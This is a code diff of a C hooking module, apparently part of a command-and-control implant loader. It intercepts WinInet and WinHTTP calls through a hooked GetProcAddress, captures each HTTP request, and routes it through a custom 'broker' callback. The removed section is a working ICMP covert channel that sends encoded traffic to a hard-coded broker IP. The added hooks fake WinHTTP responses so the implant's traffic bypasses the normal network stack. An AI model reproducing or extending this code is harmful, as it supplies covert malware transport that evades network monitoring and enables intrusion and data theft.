@@ -26,132 +26,25 @@
  * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-#include <winsock2.h>
 #include <windows.h>
 #include <heapapi.h>
-#include <wininet.h>
-#include <iphlpapi.h>
+#include <winhttp.h>
 #include <string.h>
 #include "hook.h"
 #include "cfg.h"
 #include "tcg.h"
+#include "customCallback.h"
 
-
-#define BROKER_IP          "192.168.208.137"
-#define ICMP_TIMEOUT_MS    5000
-#define ICMP_REPLY_BUFSIZE 65535
-
-/* customCallback specification:
-
-    This is what you modify. You can put any transport you want here.
- */
-static char *customCallback(const char *encodedRequest, const char *host, INTERNET_PORT port)
-{
-    HANDLE hHeap = KERNEL32$GetProcessHeap();
-    DWORD reqLen = encodedRequest ? (DWORD)MSVCRT$strlen(encodedRequest) : 0;
-    HANDLE icmpHandle = NULL;
-    char *sendBuffer = NULL;
-    char *responseBuf = NULL;
-    char *replyBuffer = NULL;
-    MSVCRT$printf("[customCallback] received request for %s:%u\n", host ? host : "", (unsigned int)port);
-
-    if (encodedRequest == NULL || reqLen == 0) {
-        MSVCRT$printf("[customCallback] no request data to send\n");
-        return NULL;
-    }
-
-    icmpHandle = IPHLPAPI$IcmpCreateFile();
-    if (icmpHandle == INVALID_HANDLE_VALUE) {
-        MSVCRT$printf("[customCallback] IcmpCreateFile failed\n");
-        return NULL;
-    }
-
-    DWORD packetLen = sizeof(DWORD) + reqLen;
-    sendBuffer = (char *)KERNEL32$HeapAlloc(hHeap, 0, packetLen);
-    if (sendBuffer == NULL) {
-        MSVCRT$printf("[customCallback] allocation failed for request buffer\n");
-        goto cleanup;
-    }
-
-    memcpy(sendBuffer, &reqLen, sizeof(DWORD));
-    memcpy(sendBuffer + sizeof(DWORD), encodedRequest, reqLen);
-
-    DWORD replySize = ICMP_REPLY_BUFSIZE;
-    replyBuffer = (char *)KERNEL32$HeapAlloc(hHeap, 0, replySize);
-    if (replyBuffer == NULL) {
-        MSVCRT$printf("[customCallback] allocation failed for reply buffer\n");
-        goto cleanup;
-    }
-
-    DWORD destIp = WS2_32$inet_addr(BROKER_IP);
-    DWORD result = IPHLPAPI$IcmpSendEcho(
-        icmpHandle,
-        destIp,
-        sendBuffer,
-        (WORD)packetLen,
-        NULL,
-        replyBuffer,
-        replySize,
-        ICMP_TIMEOUT_MS
-    );
-
-    if (result == 0) {
-        MSVCRT$printf("[customCallback] IcmpSendEcho failed\n");
-        goto cleanup;
-    }
-
-    PICMP_ECHO_REPLY pReply = (PICMP_ECHO_REPLY)replyBuffer;
-    if (pReply->Status != IP_SUCCESS) {
-        MSVCRT$printf("[customCallback] ICMP reply returned status 0x%08lx\n", (unsigned long)pReply->Status);
-        goto cleanup;
-    }
-
-    if (pReply->DataSize < sizeof(DWORD)) {
-        MSVCRT$printf("[customCallback] ICMP reply too small for length field\n");
-        goto cleanup;
-    }
-
-    DWORD responseLen = 0;
-    memcpy(&responseLen, pReply->Data, sizeof(DWORD));
-
-    if (responseLen == 0 || responseLen > (pReply->DataSize - sizeof(DWORD))) {
-        MSVCRT$printf("[customCallback] invalid response length %lu from ICMP reply\n", (unsigned long)responseLen);
-        goto cleanup;
-    }
-
-    responseBuf = (char *)KERNEL32$HeapAlloc(hHeap, 0, responseLen + 1);
-    if (responseBuf == NULL) {
-        MSVCRT$printf("[customCallback] allocation failed for response buffer\n");
-        goto cleanup;
-    }
-
-    memcpy(responseBuf, (char *)pReply->Data + sizeof(DWORD), responseLen);
-    responseBuf[responseLen] = '\0';
-
-    MSVCRT$printf("[customCallback] received %lu bytes over ICMP\n", (unsigned long)responseLen);
-
-cleanup:
-    if (sendBuffer != NULL) {
-        KERNEL32$HeapFree(hHeap, 0, sendBuffer);
-    }
-    if (replyBuffer != NULL) {
-        KERNEL32$HeapFree(hHeap, 0, replyBuffer);
-    }
-    if (icmpHandle != NULL && icmpHandle != INVALID_HANDLE_VALUE) {
-        IPHLPAPI$IcmpCloseHandle(icmpHandle);
-    }
-
-    return responseBuf;
-}
 
 /* store resolved functions */
-void * g_InternetOpenA;
-void * g_InternetConnectA;
-void * g_HttpOpenRequestA;
-void * g_HttpSendRequestA;
-void * g_HttpQueryInfoA;
-void * g_InternetReadFile;
-void * g_InternetQueryDataAvailable;
+void * g_WinHttpOpen;
+void * g_WinHttpConnect;
+void * g_WinHttpOpenRequest;
+void * g_WinHttpSendRequest;
+void * g_WinHttpReceiveResponse;
+void * g_WinHttpQueryHeaders;
+void * g_WinHttpReadData;
+void * g_WinHttpQueryDataAvailable;
 void * g_CoCreateInstance;
 void * g_ExitThread;
 
@@ -219,6 +112,55 @@ static void unlockContexts(void)
     if (g_ctxLockInitialized) {
         KERNEL32$LeaveCriticalSection(&g_ctxLock);
     }
+}
+
+static SIZE_T wideLen(const wchar_t *src)
+{
+    if (src == NULL) {
+        return 0;
+    }
+
+    SIZE_T len = 0;
+    while (src[len] != L'\0') {
+        len++;
+    }
+    return len;
+}
+
+static wchar_t *dupWide(const wchar_t *src)
+{
+    if (src == NULL) {
+        return NULL;
+    }
+
+    SIZE_T len = wideLen(src);
+    HANDLE hHeap = KERNEL32$GetProcessHeap();
+    wchar_t *dest = (wchar_t *)KERNEL32$HeapAlloc(hHeap, 0, (len + 1) * sizeof(wchar_t));
+    if (dest != NULL) {
+        for (SIZE_T i = 0; i <= len; ++i) {
+            dest[i] = src[i];
+        }
+    }
+    return dest;
+}
+
+static char *dupWideToUtf8(const wchar_t *src)
+{
+    if (src == NULL) {
+        return NULL;
+    }
+
+    int required = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, src, -1, NULL, 0, NULL, NULL);
+    if (required <= 0) {
+        return NULL;
+    }
+
+    HANDLE hHeap = KERNEL32$GetProcessHeap();
+    char *dest = (char *)KERNEL32$HeapAlloc(hHeap, 0, (SIZE_T)required);
+    if (dest != NULL) {
+        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, src, -1, dest, required, NULL, NULL);
+    }
+    return dest;
 }
 
 static char *dupString(const char *src)
@@ -779,74 +721,27 @@ static BOOL populateResponseFromJson(PREQUEST_CONTEXT ctx, const char *json)
 
 
 /*
- * Capture the parameters when WinInet is initialized so we can track every
+ * Capture the parameters when WinHTTP is initialized so we can track every
  * logical connection. The custom broker depends on this metadata to build
  * request blobs later, so we copy the strings before handing control back to
- * the original InternetOpenA implementation stored in g_InternetOpenA.
+ * the original WinHttpOpen implementation stored in g_WinHttpOpen.
  */
-HINTERNET WINAPI _InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
+HINTERNET WINAPI _WinHttpOpen(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags)
 {
-    HANDLE hHeap          = KERNEL32$GetProcessHeap();
-    LPCSTR lpszAgentLocal = lpszAgent;
-    LPCSTR lpszProxyLocal = lpszProxy;
-    LPCSTR lpszProxyByLocal = lpszProxyBypass;
-    SIZE_T len;
-    SIZE_T i;
+    LPWSTR agentCopy = dupWide(lpszAgent);
+    LPWSTR proxyCopy = dupWide(lpszProxy);
+    LPWSTR proxyBypassCopy = dupWide(lpszProxyBypass);
 
-    LPSTR agentCopy = NULL;
-    LPSTR proxyCopy = NULL;
-    LPSTR proxyBypassCopy = NULL;
-
-    if (lpszAgentLocal != NULL) {
-        len = MSVCRT$strlen(lpszAgentLocal);
-        agentCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
-        if (agentCopy != NULL) {
-            for (i = 0; i <= len; ++i) {
-                agentCopy[i] = lpszAgentLocal[i];
-            }
-        }
-    }
-
-    if (lpszProxyLocal != NULL) {
-        len = MSVCRT$strlen(lpszProxyLocal);
-        proxyCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
-        if (proxyCopy != NULL) {
-            for (i = 0; i <= len; ++i) {
-                proxyCopy[i] = lpszProxyLocal[i];
-            }
-        }
-    }
-
-    if (lpszProxyByLocal != NULL) {
-        len = MSVCRT$strlen(lpszProxyByLocal);
-        proxyBypassCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
-        if (proxyBypassCopy != NULL) {
-            for (i = 0; i <= len; ++i) {
-                proxyBypassCopy[i] = lpszProxyByLocal[i];
-            }
-        }
-    }
-
-    //MSVCRT$printf("[hook] InternetOpenA called!\n");
-
-    typedef HINTERNET (WINAPI *PFN_INTERNETOPENA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
-    PFN_INTERNETOPENA fnInternetOpenA = (PFN_INTERNETOPENA)g_InternetOpenA;
+    typedef HINTERNET (WINAPI *PFN_WINHTTPOPEN)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+    PFN_WINHTTPOPEN fnWinHttpOpen = (PFN_WINHTTPOPEN)g_WinHttpOpen;
     HINTERNET result = NULL;
-    if (fnInternetOpenA != NULL) {
-        result = fnInternetOpenA(agentCopy, dwAccessType, proxyCopy, proxyBypassCopy, dwFlags);
+    if (fnWinHttpOpen != NULL) {
+        result = fnWinHttpOpen(agentCopy, dwAccessType, proxyCopy, proxyBypassCopy, dwFlags);
     }
 
-    if (agentCopy != NULL) {
-        KERNEL32$HeapFree(hHeap, 0, agentCopy);
-    }
-
-    if (proxyCopy != NULL) {
-        KERNEL32$HeapFree(hHeap, 0, proxyCopy);
-    }
-
-    if (proxyBypassCopy != NULL) {
-        KERNEL32$HeapFree(hHeap, 0, proxyBypassCopy);
-    }
+    if (agentCopy)       KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, agentCopy);
+    if (proxyCopy)       KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, proxyCopy);
+    if (proxyBypassCopy) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, proxyBypassCopy);
 
     return result;
 }
@@ -854,162 +749,79 @@ HINTERNET WINAPI _InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lps
 
 /*
  * Hook the connection handshake to stash the server/port information inside
- * the connection list. That way HttpOpenRequestA can look up the host for the
+ * the connection list. That way WinHttpOpenRequest can look up the host for the
  * JSON payload that gets sent off to customCallback.
  */
-HINTERNET WINAPI _InternetConnectA(
+HINTERNET WINAPI _WinHttpConnect(
     HINTERNET     hInternet,
-    LPCSTR        lpszServerName,
+    LPCWSTR       lpszServerName,
     INTERNET_PORT nServerPort,
-    LPCSTR        lpszUserName,
-    LPCSTR        lpszPassword,
-    DWORD         dwService,
-    DWORD         dwFlags,
-    DWORD_PTR     dwContext
+    DWORD         dwReserved
 )
 {
-    // Heap copies of string arguments (avoid stack/VLA/_alloca → no ___chkstk_ms)
-    LPSTR serverNameCopy  = NULL;
-    LPSTR userNameCopy    = NULL;
-    LPSTR passwordCopy    = NULL;
-    SIZE_T len;
-    SIZE_T i;
-    HANDLE hHeap = KERNEL32$GetProcessHeap();
+    LPWSTR serverNameCopy  = dupWide(lpszServerName);
+    char *hostUtf8         = dupWideToUtf8(lpszServerName);
+    HANDLE hHeap           = KERNEL32$GetProcessHeap();
 
-    if (lpszServerName != NULL) {
-        len = MSVCRT$strlen(lpszServerName);
-        serverNameCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
-        if (serverNameCopy != NULL) {
-            for (i = 0; i <= len; ++i) {      // includes '\0'
-                serverNameCopy[i] = lpszServerName[i];
-            }
-        }
-    }
-
-    if (lpszUserName != NULL) {
-        len = MSVCRT$strlen(lpszUserName);
-        userNameCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
-        if (userNameCopy != NULL) {
-            for (i = 0; i <= len; ++i) {
-                userNameCopy[i] = lpszUserName[i];
-            }
-        }
-    }
-
-    if (lpszPassword != NULL) {
-        len = MSVCRT$strlen(lpszPassword);
-        passwordCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
-        if (passwordCopy != NULL) {
-            for (i = 0; i <= len; ++i) {
-                passwordCopy[i] = lpszPassword[i];
-            }
-        }
-    }
-
-    //MSVCRT$printf("[hook] InternetConnectA called!\n");
-
-    typedef HINTERNET (WINAPI *PFN_INTERNETCONNECTA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
-    PFN_INTERNETCONNECTA fnInternetConnectA = (PFN_INTERNETCONNECTA)g_InternetConnectA;
+    typedef HINTERNET (WINAPI *PFN_WINHTTPCONNECT)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
+    PFN_WINHTTPCONNECT fnWinHttpConnect = (PFN_WINHTTPCONNECT)g_WinHttpConnect;
     HINTERNET result = NULL;
-    if (fnInternetConnectA != NULL) {
-        result = fnInternetConnectA(hInternet, serverNameCopy, nServerPort, userNameCopy, passwordCopy, dwService, dwFlags, dwContext);
+    if (fnWinHttpConnect != NULL) {
+        result = fnWinHttpConnect(hInternet, serverNameCopy, nServerPort, dwReserved);
     }
 
 
     if (result != NULL) {
         lockContexts();
-        addConnection(result, lpszServerName, nServerPort);
+        addConnection(result, hostUtf8, nServerPort);
         unlockContexts();
     }
 
     if (serverNameCopy) KERNEL32$HeapFree(hHeap, 0, serverNameCopy);
-    if (userNameCopy)   KERNEL32$HeapFree(hHeap, 0, userNameCopy);
-    if (passwordCopy)   KERNEL32$HeapFree(hHeap, 0, passwordCopy);
+    if (hostUtf8)       KERNEL32$HeapFree(hHeap, 0, hostUtf8);
 
     return result;
 }
 
 /*
- * Replace HttpOpenRequestA so we can tag each request with the correct verb,
+ * Replace WinHttpOpenRequest so we can tag each request with the correct verb,
  * path, and scheme before it reaches the broker. The stored connection info
  * lets us enrich the serialized payload with host/port context.
  */
-HINTERNET WINAPI _HttpOpenRequestA(
+HINTERNET WINAPI _WinHttpOpenRequest(
     HINTERNET  hConnect,
-    LPCSTR     lpszVerb,
-    LPCSTR     lpszObjectName,
-    LPCSTR     lpszVersion,
-    LPCSTR     lpszReferrer,
-    LPCSTR   * lplpszAcceptTypes,
+    LPCWSTR    lpszVerb,
+    LPCWSTR    lpszObjectName,
+    LPCWSTR    lpszVersion,
+    LPCWSTR    lpszReferrer,
+    LPCWSTR  * lplpszAcceptTypes,
     DWORD      dwFlags,
     DWORD_PTR  dwContext
 )
 {
     HANDLE hHeap = KERNEL32$GetProcessHeap();
-    LPSTR  verbCopy = NULL;
-    LPSTR  objectNameCopy = NULL;
-    LPSTR  versionCopy = NULL;
-    LPSTR  referrerCopy = NULL;
-    SIZE_T len;
-    SIZE_T i;
+    LPWSTR verbCopy = dupWide(lpszVerb);
+    LPWSTR objectNameCopy = dupWide(lpszObjectName);
+    LPWSTR versionCopy = dupWide(lpszVersion);
+    LPWSTR referrerCopy = dupWide(lpszReferrer);
+    char *verbUtf8 = dupWideToUtf8(lpszVerb);
+    char *objectUtf8 = dupWideToUtf8(lpszObjectName);
 
-    if (lpszVerb != NULL) {
-        len = MSVCRT$strlen(lpszVerb);
-        verbCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
-        if (verbCopy != NULL) {
-            for (i = 0; i <= len; ++i) {
-                verbCopy[i] = lpszVerb[i];
-            }
-        }
-    }
-
-    if (lpszObjectName != NULL) {
-        len = MSVCRT$strlen(lpszObjectName);
-        objectNameCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
-        if (objectNameCopy != NULL) {
-            for (i = 0; i <= len; ++i) {
-                objectNameCopy[i] = lpszObjectName[i];
-            }
-        }
-    }
-
-    if (lpszVersion != NULL) {
-        len = MSVCRT$strlen(lpszVersion);
-        versionCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
-        if (versionCopy != NULL) {
-            for (i = 0; i <= len; ++i) {
-                versionCopy[i] = lpszVersion[i];
-            }
-        }
-    }
-
-    if (lpszReferrer != NULL) {
-        len = MSVCRT$strlen(lpszReferrer);
-        referrerCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
-        if (referrerCopy != NULL) {
-            for (i = 0; i <= len; ++i) {
-                referrerCopy[i] = lpszReferrer[i];
-            }
-        }
-    }
-
-    //MSVCRT$printf("[hook] HttpOpenRequestA called!\n");
-
-    typedef HINTERNET (WINAPI *PFN_HTTPOPENREQUESTA)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR *, DWORD, DWORD_PTR);
-    PFN_HTTPOPENREQUESTA fnHttpOpenRequestA = (PFN_HTTPOPENREQUESTA)g_HttpOpenRequestA;
+    typedef HINTERNET (WINAPI *PFN_WINHTTPOPENREQUEST)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR *, DWORD, DWORD_PTR);
+    PFN_WINHTTPOPENREQUEST fnWinHttpOpenRequest = (PFN_WINHTTPOPENREQUEST)g_WinHttpOpenRequest;
     HINTERNET result = NULL;
-    if (fnHttpOpenRequestA != NULL) {
-        result = fnHttpOpenRequestA(hConnect, verbCopy, objectNameCopy, versionCopy, referrerCopy, lplpszAcceptTypes, dwFlags, dwContext);
+    if (fnWinHttpOpenRequest != NULL) {
+        result = fnWinHttpOpenRequest(hConnect, verbCopy, objectNameCopy, versionCopy, referrerCopy, lplpszAcceptTypes, dwFlags, dwContext);
     }
 
 
     if (result != NULL) {
         lockContexts();
         PCONNECTION_CONTEXT conn = findConnection(hConnect);
-        const char *scheme = (dwFlags & INTERNET_FLAG_SECURE) ? "https" : "http";
+        const char *scheme = (dwFlags & WINHTTP_FLAG_SECURE) ? "https" : "http";
         const char *hostValue = conn && conn->host ? conn->host : "";
         INTERNET_PORT portValue = conn ? conn->port : 0;
-        trackRequest(result, lpszVerb, scheme, hostValue, portValue, lpszObjectName);
+        trackRequest(result, verbUtf8 ? verbUtf8 : "", scheme, hostValue, portValue, objectUtf8 ? objectUtf8 : "");
         unlockContexts();
     }
 
@@ -1017,37 +829,46 @@ HINTERNET WINAPI _HttpOpenRequestA(
     if (objectNameCopy) KERNEL32$HeapFree(hHeap, 0, objectNameCopy);
     if (versionCopy)    KERNEL32$HeapFree(hHeap, 0, versionCopy);
     if (referrerCopy)   KERNEL32$HeapFree(hHeap, 0, referrerCopy);
+    if (verbUtf8)       KERNEL32$HeapFree(hHeap, 0, verbUtf8);
+    if (objectUtf8)     KERNEL32$HeapFree(hHeap, 0, objectUtf8);
 
     return result;
 }
 
 /*
- * Intercept HttpSendRequestA, capture headers/body, base64‑encode the payload,
+ * Intercept WinHttpSendRequest, capture headers/body, base64‑encode the payload,
  * and hand it to customCallback. The broker decides how to actually issue the
- * request, and we cache the response for the rest of the WinInet pipeline.
+ * request, and we cache the response for the rest of the WinHTTP pipeline.
  */
-BOOL WINAPI _HttpSendRequestA(
+BOOL WINAPI _WinHttpSendRequest(
     HINTERNET hRequest,
-    LPCSTR    lpszHeaders,
+    LPCWSTR   lpszHeaders,
     DWORD     dwHeadersLength,
     LPVOID    lpOptional,
-    DWORD     dwOptionalLength
+    DWORD     dwOptionalLength,
+    DWORD     dwTotalLength,
+    DWORD_PTR dwContext
 )
 {
     HANDLE hHeap = KERNEL32$GetProcessHeap();
     LPSTR  headersCopy = NULL;
     LPVOID optionalCopy = NULL;
-    SIZE_T len = 0;
     SIZE_T i;
 
+    (void)dwTotalLength;
+    (void)dwContext;
+
     if (lpszHeaders != NULL && dwHeadersLength != 0) {
-        len = (dwHeadersLength == (DWORD)-1) ? MSVCRT$strlen(lpszHeaders) : dwHeadersLength;
-        headersCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
-        if (headersCopy != NULL) {
-            for (i = 0; i < len; ++i) {
-                headersCopy[i] = lpszHeaders[i];
+        DWORD headerChars = (dwHeadersLength == (DWORD)-1) ? (DWORD)wideLen(lpszHeaders) : dwHeadersLength;
+        if (headerChars > 0) {
+            int required = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, lpszHeaders, (int)headerChars, NULL, 0, NULL, NULL);
+            if (required > 0) {
+                headersCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, (SIZE_T)required + 1);
+                if (headersCopy != NULL) {
+                    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, lpszHeaders, (int)headerChars, headersCopy, required, NULL, NULL);
+                    headersCopy[required] = '\0';
+                }
             }
-            headersCopy[len] = '\0';
         }
     }
 
@@ -1098,18 +919,43 @@ BOOL WINAPI _HttpSendRequestA(
 
     if (headersCopy)   KERNEL32$HeapFree(hHeap, 0, headersCopy);
     if (optionalCopy)  KERNEL32$HeapFree(hHeap, 0, optionalCopy);
-    KERNEL32$SetLastError(ERROR_INTERNET_TIMEOUT);
+    KERNEL32$SetLastError(ERROR_WINHTTP_TIMEOUT);
     return FALSE;
 }
 
 /*
- * Serve subsequent HttpQueryInfoA reads from the cached response instead of
- * poking WinInet again, so the caller sees the exact headers/status the broker
+ * Ack the receive step immediately when we've already satisfied the request
+ * via the broker. This keeps WinHTTP callers happy without touching the
+ * network stack.
+ */
+BOOL WINAPI _WinHttpReceiveResponse(
+    HINTERNET hRequest,
+    LPVOID    lpReserved
+)
+{
+    (void)lpReserved;
+
+    lockContexts();
+    PREQUEST_CONTEXT ctx = findRequest(hRequest);
+    unlockContexts();
+
+    if (ctx != NULL && ctx->response.statusCode != 0) {
+        return TRUE;
+    }
+
+    KERNEL32$SetLastError(ERROR_WINHTTP_TIMEOUT);
+    return FALSE;
+}
+
+/*
+ * Serve subsequent WinHttpQueryHeaders reads from the cached response instead of
+ * poking WinHTTP again, so the caller sees the exact headers/status the broker
  * provided.
  */
-BOOL WINAPI _HttpQueryInfoA(
+BOOL WINAPI _WinHttpQueryHeaders(
     HINTERNET hRequest,
     DWORD     dwInfoLevel,
+    LPCWSTR   pwszName,
     LPVOID    lpBuffer,
     LPDWORD   lpdwBufferLength,
     LPDWORD   lpdwIndex
@@ -1119,8 +965,10 @@ BOOL WINAPI _HttpQueryInfoA(
     DWORD  indexLocal         = (lpdwIndex != NULL) ? *lpdwIndex : 0;
 
     DWORD baseInfo = dwInfoLevel & 0x0000FFFF;
-    BOOL flagNumber = (dwInfoLevel & HTTP_QUERY_FLAG_NUMBER) != 0;
+    BOOL flagNumber = (dwInfoLevel & WINHTTP_QUERY_FLAG_NUMBER) != 0;
     BOOL served = FALSE;
+
+    (void)pwszName;
 
     lockContexts();
     PREQUEST_CONTEXT ctx = findRequest(hRequest);
@@ -1129,20 +977,20 @@ BOOL WINAPI _HttpQueryInfoA(
     if (ctx != NULL && ctx->response.statusCode != 0) {
         const char *stringValue = NULL;
         DWORD numericValue = 0;
-        if (baseInfo == HTTP_QUERY_STATUS_CODE) {
+        if (baseInfo == WINHTTP_QUERY_STATUS_CODE) {
             numericValue = ctx->response.statusCode;
             char statusBuf[16];
             int written = MSVCRT$sprintf(statusBuf, "%lu", (unsigned long)numericValue);
             statusBuf[written] = '\0';
             stringValue = statusBuf;
         }
-        else if (baseInfo == HTTP_QUERY_STATUS_TEXT) {
-            stringValue = ctx->response.statusText ? ctx->response.statusText : "";
+        else if (baseInfo == WINHTTP_QUERY_STATUS_TEXT) {
+            stringValue = ctx->response.statusText;
         }
-        else if (baseInfo == HTTP_QUERY_RAW_HEADERS || baseInfo == HTTP_QUERY_RAW_HEADERS_CRLF) {
-            stringValue = ctx->response.headersBlock ? ctx->response.headersBlock : "";
+        else if (baseInfo == WINHTTP_QUERY_RAW_HEADERS_CRLF) {
+            stringValue = ctx->response.headersBlock;
         }
-        else if (baseInfo == HTTP_QUERY_CONTENT_LENGTH) {
+        else if (baseInfo == WINHTTP_QUERY_CONTENT_LENGTH) {
             numericValue = ctx->response.bodyLength;
             char lenBuf[24];
             int written = MSVCRT$sprintf(lenBuf, "%lu", (unsigned long)numericValue);
@@ -1165,18 +1013,18 @@ BOOL WINAPI _HttpQueryInfoA(
                 }
             }
             else {
-                DWORD required = (DWORD)MSVCRT$strlen(stringValue) + 1;
-                if (lpdwBufferLength != NULL) {
-                    *lpdwBufferLength = required;
-                }
-                if (lpBuffer != NULL && bufferLengthLocal >= required) {
-                    for (DWORD i = 0; i < required; ++i) {
-                        ((BYTE *)lpBuffer)[i] = ((const BYTE *)stringValue)[i];
+                int required = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, stringValue, -1, NULL, 0);
+                if (required > 0) {
+                    if (lpdwBufferLength != NULL) {
+                        *lpdwBufferLength = (DWORD)required;
                     }
-                    served = TRUE;
-                }
-                else {
-                    served = FALSE;
+                    if (lpBuffer != NULL && bufferLengthLocal >= (DWORD)required) {
+                        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, stringValue, -1, (LPWSTR)lpBuffer, required);
+                        served = TRUE;
+                    }
+                    else {
+                        served = FALSE;
+                    }
                 }
             }
         }
@@ -1192,7 +1040,7 @@ BOOL WINAPI _HttpQueryInfoA(
     if (lpdwIndex != NULL) {
         *lpdwIndex = indexLocal;
     }
-    KERNEL32$SetLastError(ERROR_INTERNET_TIMEOUT);
+    KERNEL32$SetLastError(ERROR_WINHTTP_TIMEOUT);
     return FALSE;
 }
 
@@ -1200,11 +1048,9 @@ BOOL WINAPI _HttpQueryInfoA(
  * Report how many bytes arrived from the broker so callers that inspect this
  * information behave as if they had read from a real socket.
  */
-BOOL WINAPI _InternetQueryDataAvailable(
+BOOL WINAPI _WinHttpQueryDataAvailable(
     HINTERNET hFile,
-    LPDWORD   lpdwNumberOfBytesAvailable,
-    DWORD     dwFlags,
-    DWORD_PTR dwContext
+    LPDWORD   lpdwNumberOfBytesAvailable
 )
 {
     DWORD available = 0;
@@ -1227,16 +1073,16 @@ BOOL WINAPI _InternetQueryDataAvailable(
         *lpdwNumberOfBytesAvailable = 0;
     }
 
-    KERNEL32$SetLastError(ERROR_INTERNET_TIMEOUT);
+    KERNEL32$SetLastError(ERROR_WINHTTP_TIMEOUT);
     return FALSE;
 }
 
 /*
- * Feed the cached response body back to the caller instead of letting WinInet
+ * Feed the cached response body back to the caller instead of letting WinHTTP
  * touch the network; this keeps the standard HTTP read loop happy while the
  * broker handles the real I/O.
  */
-BOOL WINAPI _InternetReadFile(
+BOOL WINAPI _WinHttpReadData(
     HINTERNET hFile,
     LPVOID    lpBuffer,
     DWORD     dwNumberOfBytesToRead,
@@ -1266,7 +1112,7 @@ BOOL WINAPI _InternetReadFile(
         *lpdwNumberOfBytesRead = 0;
     }
 
-    KERNEL32$SetLastError(ERROR_INTERNET_TIMEOUT);
+    KERNEL32$SetLastError(ERROR_WINHTTP_TIMEOUT);
     return FALSE;
 }
 
@@ -1321,29 +1167,37 @@ char * WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
     else if (h == LOADLIBRARYA_HASH) {
         resolved = (char *)KERNEL32$LoadLibraryA;
     }
-    else if (h == INTERNETOPENA_HASH) {
-        g_InternetOpenA = result;
-        resolved = (char *)_InternetOpenA;
+    else if (h == WINHTTPOPEN_HASH) {
+        g_WinHttpOpen = result;
+        resolved = (char *)_WinHttpOpen;
     }
-    else if (h == INTERNETCONNECTA_HASH) {
-        g_InternetConnectA = result;
-        resolved = (char *)_InternetConnectA;
+    else if (h == WINHTTPCONNECT_HASH) {
+        g_WinHttpConnect = result;
+        resolved = (char *)_WinHttpConnect;
     }
-    else if (h == HTTPOPENREQUESTA_HASH) {
-        g_HttpOpenRequestA = result;
-        resolved = (char *)_HttpOpenRequestA;
+    else if (h == WINHTTPOPENREQUEST_HASH) {
+        g_WinHttpOpenRequest = result;
+        resolved = (char *)_WinHttpOpenRequest;
     }
-    else if (h == HTTPSENDREQUESTA_HASH) {
-        resolved = (char *)_HttpSendRequestA;
+    else if (h == WINHTTPSENDREQUEST_HASH) {
+        g_WinHttpSendRequest = result;
+        resolved = (char *)_WinHttpSendRequest;
     }
-    else if (h == HTTPQUERYINFOA_HASH) {
-        resolved = (char *)_HttpQueryInfoA;
+    else if (h == WINHTTPRECEIVERESPONSE_HASH) {
+        g_WinHttpReceiveResponse = result;
+        resolved = (char *)_WinHttpReceiveResponse;
     }
-    else if (h == INTERNETQUERYDATAAVAILABLE_HASH) {
-        resolved = (char *)_InternetQueryDataAvailable;
+    else if (h == WINHTTPQUERYHEADERS_HASH) {
+        g_WinHttpQueryHeaders = result;
+        resolved = (char *)_WinHttpQueryHeaders;
     }
-    else if (h == INTERNETREADFILE_HASH) {
-        resolved = (char *)_InternetReadFile;
+    else if (h == WINHTTPQUERYDATAAVAILABLE_HASH) {
+        g_WinHttpQueryDataAvailable = result;
+        resolved = (char *)_WinHttpQueryDataAvailable;
+    }
+    else if (h == WINHTTPREADDATA_HASH) {
+        g_WinHttpReadData = result;
+        resolved = (char *)_WinHttpReadData;
     }
 
 cleanup:
